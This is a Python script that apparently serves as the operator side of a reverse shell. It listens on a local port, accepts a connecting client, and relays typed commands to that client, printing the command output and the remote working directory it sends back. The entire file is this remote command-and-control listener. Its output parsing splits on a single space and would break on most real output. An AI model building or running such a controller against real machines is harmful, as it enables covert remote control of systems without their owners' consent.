import socket

serverHost = "localhost"
serverPort = 12000

# 128KB max size of messages; Can be increased!
bufferSize = 1024 * 128

# Used to separate string for 2 messages
separator = " "

s = socket.socket()
s.bind((serverHost, serverPort))

# Make the PORT reusable
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {serverHost}:{serverPort} ...")

clientSocket, clientAddress = s.accept()
print(f"{clientAddress[0]}:{clientAddress[1]} Connected")

# Receive current working directory of client
cwd = clientSocket.recv(bufferSize).decode()
print("[+] Current Working Directory: ", cwd)

while True:
    # Command Input
    command = input(f"{cwd} > ")
    if(not command.strip()):
        # Empty Command
        continue
    # Send command to client
    clientSocket.send(command.encode())

    if(command.upper() == "EXIT"):
        break

    output = clientSocket.recv(bufferSize).decode()
    print("Output: ", output)

    # Split command output and current directory
    results, cwd = output.split(separator)

    print(results)

clientSocket.close()
s.close()

